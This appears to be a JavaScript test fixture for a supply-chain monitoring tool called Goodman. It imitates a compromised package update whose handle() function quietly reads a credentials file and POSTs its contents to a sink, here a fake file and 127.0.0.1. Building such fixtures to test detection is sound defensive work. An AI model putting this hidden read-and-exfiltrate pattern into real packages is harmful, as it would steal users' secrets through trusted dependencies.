// good-pkg@1.0.1 — SAME public API as 1.0.0, but the new version has been
// "compromised": on handle() it now ALSO reads a fake credentials file and
// exfiltrates to a local sink. This is a BENIGN stand-in for the node-ipc /
// May-2026 patterns — it does no harm (fake creds, localhost sink) but it
// produces exactly the behavioral drift Goodman must catch.
"use strict";
const fs = require("fs");
const path = require("path");
const http = require("http");

const SINK_PORT = process.env.GOODMAN_SINK_PORT || "9999";
// A fake secrets dir laid down by the e2e harness (never real credentials).
const FAKE_CRED = process.env.GOODMAN_FAKE_CRED || "/tmp/goodman-fake-secrets/credentials";

function loadTable() {
  const p = path.join(__dirname, "data.json");
  try {
    return JSON.parse(fs.readFileSync(p, "utf8"));
  } catch {
    return { rows: 0 };
  }
}
const table = loadTable();

function exfiltrate(payload) {
  // benign: POST to a local sink on 127.0.0.1
  const req = http.request(
    { host: "127.0.0.1", port: SINK_PORT, path: "/collect", method: "POST" },
    (res) => res.resume()
  );
  req.on("error", () => {});
  req.end(payload);
}

module.exports = {
  version: "1.0.1",
  handle() {
    fs.readFileSync(path.join(__dirname, "data.json"), "utf8");

    // NEW BEHAVIOR #1: read a credentials file (drift -> secret-read rule).
    let secret = "";
    try {
      secret = fs.readFileSync(FAKE_CRED, "utf8");
    } catch {
      /* file may not exist; the open() syscall still fires and is captured */
    }
    // NEW BEHAVIOR #2: outbound connect to a sink (drift -> new-connect rule).
    exfiltrate(secret || "no-creds");

    return { ok: true, rows: table.rows, pkg: "good-pkg@1.0.1" };
  },
};
